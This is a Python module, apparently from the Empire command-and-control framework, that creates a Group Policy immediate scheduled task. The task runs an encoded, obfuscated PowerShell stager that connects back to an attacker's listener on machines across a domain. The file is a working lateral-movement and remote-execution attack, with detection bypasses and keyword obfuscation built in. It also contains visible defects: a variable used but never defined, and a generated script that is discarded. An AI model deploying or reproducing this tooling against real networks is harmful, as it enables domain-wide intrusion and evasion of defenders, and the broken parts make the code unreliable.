from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        module_name = 'New-GPOImmediateTask'
        listener_name = params['Listener']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        ObfuscateCommand = params['ObfuscateCommand']

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        else:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                           obfuscate=obfuscate, obfuscationCommand=ObfuscateCommand,
                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                           bypasses=params['Bypasses'])

            command = "/c \"" + launcher + "\""

            if command == "":
                return handle_error_message("[!] Error processing command")

            else:

                # read in the common powerview.ps1 module source code
                module_source = main_menu.installPath + "/data/module_source/situational_awareness/network/powerview.ps1"
                if main_menu.obfuscate:
                    obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
                    if pathlib.Path(obfuscated_module_source).is_file():
                        module_source = obfuscated_module_source

                try:
                    with open(module_source, 'r') as f:
                        module_code = f.read()
                except:
                    return handle_error_message("[!] Could not read module source path at: " + str(module_source))

                if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
                    script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
                                                 obfuscationCommand=main_menu.obfuscateCommand)
                else:
                    script = module_code

                # get just the code needed for the specified function
                script = helpers.generate_dynamic_powershell_script(module_code, module_name)

                script = module_name + " -Command cmd -CommandArguments '" + command + "' -Force"

                for option, values in params.items():
                    if option.lower() in ["taskname", "taskdescription", "taskauthor", "gponame", "gpodisplayname",
                                          "domain", "domaincontroller"]:
                        if values and values != '':
                            if values.lower() == "true":
                                # if we're just adding a switch
                                script += " -" + str(option)
                            else:
                                script += " -" + str(option) + " '" + str(values) + "'"

                outputf = params.get("OutputFunction", "Out-String")
                script += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
